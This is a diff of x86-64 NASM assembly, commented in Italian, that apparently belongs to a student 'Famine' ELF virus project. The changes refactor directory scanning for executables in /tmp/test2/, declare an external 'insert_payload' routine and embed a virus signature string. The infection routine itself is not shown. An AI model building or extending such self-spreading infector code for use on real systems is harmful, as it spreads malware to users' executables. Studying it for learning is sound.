@@ -92,18 +92,6 @@
 	restore_regx
 %endmacro
 
-%macro strcpy_my 2 ; src, dest
-	save_regx
-	mov	rax, -1			;i = -1
-	%%strcpy_loop:						;while
-   		inc	rax			;i++
-   		mov	cl, byte [%1 + rax]	;cl = src[i]
-   		mov	byte [%2 + rax], cl	;dest[i] = cl
-   		cmp	cl, 0			;if cl == 0
-   		jne	%%strcpy_loop			;jump to end if 0
-   		restore_regx
-%endmacro
-
 %macro bzero_my 1 ; ptr
 	save_regx
 	mov rax, -1
@@ -159,11 +147,11 @@
    		pop rax							; richiamo fd della cartella
    		close_my rax					; chiudo fd
 	%%loop_my:
-   		add r15, 19						; ptr + d_name[]
+   		add r15, dirent.d_name			; ptr + d_name[]
    		strcat_my %1, r15, buffer		; unisco in buffer il percorso della dir e il nome del file
    		check_executable buffer			; controllo se il file è un eseguibile
    		cmp rax, 0						; se rax == 0 è eseguibile
-   		jne %%else_print_file				; altrimenti si va avanti nel loop
+   		jne %%else_print_file			; altrimenti si va avanti nel loop
    %%if_print_file:
    		strlen_my r15					; conto caratteri nome file
    		write_my r15, rax				; stampo nome file
@@ -171,13 +159,16 @@
    		jmp %%end_if
    %%else_print_file:
    %%end_if:
-   		sub r15, 19						; ptr - d_name[]
-   		mov r13w, [r15 + 16]			; salvo la grandezza di questa struttura
+   		sub r15, dirent.d_name			; ptr - d_name[]
+   		xor r13, r13					; pulisco r13 prima di copiare il dato
+   		mov r13w, [r15 + dirent.d_reclen]; salvo la grandezza di questa struttura
    		add r15, r13					; ptr + size struttura
    		sub r14, r13					; sottraggo la size della struttura dal totale letto
    		cmp r14, 0						; controllo se ho letto tutti i byte restituiti
    		ja %%loop_my
 %endmacro
+
+extern insert_payload
 
 section .bss
 	linux_dirent64 resb BUF_SIZE
@@ -187,8 +178,16 @@ section .bss
 section .text
 	global _start
 
+	struc dirent
+		.d_ino resb 8
+		.d_off resb 8
+		.d_reclen resb 2
+		.d_type resb 1
+		.d_name resb 8
+	endstruc
+
 _start:
-	check_dir string_dir1
+	;check_dir string_dir1
 	check_dir string_dir2
 	exit_my 0
 
@@ -203,3 +202,9 @@ string_dir1:
 
 string_dir2:
 	db '/tmp/test2/', 0
+
+firma:
+	db 'Famine version 1.0 (c)oded by usavoia-usavoia', 0x00
+
+end:
+	jmp 0xffffffff
